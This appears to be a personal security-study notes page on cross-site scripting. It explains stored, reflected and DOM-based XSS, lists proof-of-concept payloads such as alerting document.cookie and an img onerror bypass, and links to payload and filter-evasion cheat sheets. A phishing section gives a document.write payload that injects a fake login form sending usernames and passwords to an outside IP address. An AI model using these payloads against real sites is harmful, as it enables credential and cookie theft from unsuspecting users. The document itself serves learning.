---
{"dg-publish":true,"permalink":"/net/sec/cross-side-scripting/"}
---

- When a vulnerable web application does not properly ==sanitize user input==, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply)
- another user views the same page
	- they unknowingly execute the malicious JavaScript code.
## XSS Types


- [[Stored XSS\|Stored XSS]]
- [[net/sec/xss/Reflected XSS\|Reflected XSS]]
- [[DOM-based XSS\|DOM-based XSS]]


| Type                             | Description                                                                                                                                                                                                                                            |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Stored (Persistent) XSS`        | The most critical type of XSS<br>-  occurs when user input is **stored on the back-end database** and then **displayed upon retrieval**                                                                                                                |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server<br>-  but without being stored <br>-  search result or error message                                                                                       |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side<br>-  without reaching the back-end server (e.g.<br>-  through client-side HTTP parameters or anchor tags) |


## Examples


```html
<script>alert('999');</script>
```

```html
<script>alert(document.cookie);</script>
```

_If alert is blocked_


```html
<script>alert(window.origin)</script>
```

_If script is blocked_

```html
<img src="" onerror=alert(window.origin)>
```

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/xss-payloads/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">





- [GitHub - payloadbox/xss-payload-list: 🎯 Cross Site Scripting ( XSS ) Vulnerability Payload List](https://github.com/payloadbox/xss-payload-list)
- [PayloadsAllTheThings/XSS Injection/README.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)

---

- [Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [TOPXSS.md](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md)
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://forum.bugcrowd.com/t/how-to-make-more-harmful-injection-in-img-src-with-no-csp-and-trigger-js-in-img-tag/5229
- https://tryhackme.com/r/room/axss
- https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-html
- https://www.invicti.com/learn/xss-filter-evasion/


<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/xss-filter-evasion/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html **([[Open Worldwide Application Security Project\|OWASP]])**


</div></div>


</div></div>

```html
const name = new URLSearchParams(window.location.search).get('name');
console.log("Hello, " + name);
```

```
fetch('http://localhost').then(response => console.log(response.blob()));
```
## Form Injection for [[Phishing\|Phishing]]

- [Cross-site scripting (XSS) - Security \| MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
- [F​​e​tc​h​​i​​n​​g ​T​i​tl​e​](https://www.securecodewarrior.com/guidelines/injection-xss)
```js
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.11><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```


```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.11><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove() <!--;
```

## Tools

[[XSStrike\|XSStrike]]